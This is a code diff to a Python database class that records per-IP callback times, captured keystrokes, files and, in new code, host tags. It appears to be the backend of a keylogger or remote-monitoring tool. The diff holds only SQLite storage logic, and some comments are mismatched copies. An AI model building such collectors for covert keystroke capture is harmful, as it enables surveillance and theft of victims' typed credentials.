@@ -95,7 +95,7 @@ class Database(object):
         if not vip(addr):
             raise Exception("Not a valid IP")
         # Create a query string that will update the last check in time for an ip
-        qry1 = "REPLACE INTO timestamps('ip') VALUES(?);"
+        qry1 = "INSERT INTO timestamps('ip') VALUES(?);"
         # Create a string that will add the keystroke to the DB
         qry2 = "INSERT INTO data('ip','name', 'data') VALUES(?,?,?);"
         # Update the last callback time
@@ -114,7 +114,7 @@ class Database(object):
         if not vip(addr):
             raise Exception("Not a valid IP")
         # Create a query string that will update the last check in time for an ip
-        qry1 = "REPLACE INTO timestamps('ip') VALUES(?);"
+        qry1 = "INSERT INTO timestamps('ip') VALUES(?);"
         # Create a string that will add the keystroke to the DB
         qry2 = "INSERT INTO keystrokes('ip','keystroke') VALUES(?,?);"
         # Update the last callback time
@@ -133,13 +133,29 @@ class Database(object):
         if not vip(addr):
             raise Exception("Not a valid IP")
         # Create a query string that will update the last check in time for an ip
-        qry1 = "REPLACE INTO timestamps('ip') VALUES(?);"
+        qry1 = "INSERT INTO timestamps('ip') VALUES(?);"
         # Create a string that will add the filename to the DB
         qry2 = "INSERT INTO files('ip','filename') VALUES(?,?);"
         # Update the last callback time
         self.cur.execute(qry1, (addr,))
         # Add the filename to the database
         self.cur.execute(qry2, (addr, "/" + filename))
+        # Write the changes to the DB
+        self.conn.commit()
+
+    def add_tag(self, addr, tag):
+        """
+        Add a tag entry for a host to the DB
+        """
+        # Make sure we are using a valid IP address
+        addr = addr.strip()
+        if not vip(addr):
+            raise Exception("Not a valid IP")
+        # Create a string that will add the filename to the DB
+        qry1 = "INSERT INTO tags('ip','tag') VALUES(?,?);"
+        # Update the last callback time
+        self.cur.execute(qry1, (addr, tag))
+        # Add the filename to the database
         # Write the changes to the DB
         self.conn.commit()
 
@@ -178,6 +194,21 @@ class Database(object):
         if not results:
             return {}
         return results
+
+    def get_tags(self, addr):
+        """Get a list of tags for a given host in the database"""
+        # construct and execute query
+        qry = "SELECT * FROM {} WHERE {} = ?;".format("tags", "ip")
+        self.cur.execute(qry, (addr,))
+        results = self.cur.fetchall()
+
+        # fix results into proper array
+        new_results = []
+        for item in results:
+            new_results += [item[2]]
+
+        # return results
+        return new_results
 
     def get_unique_hosts(self):
         """Get a list of unique hosts in the database"""
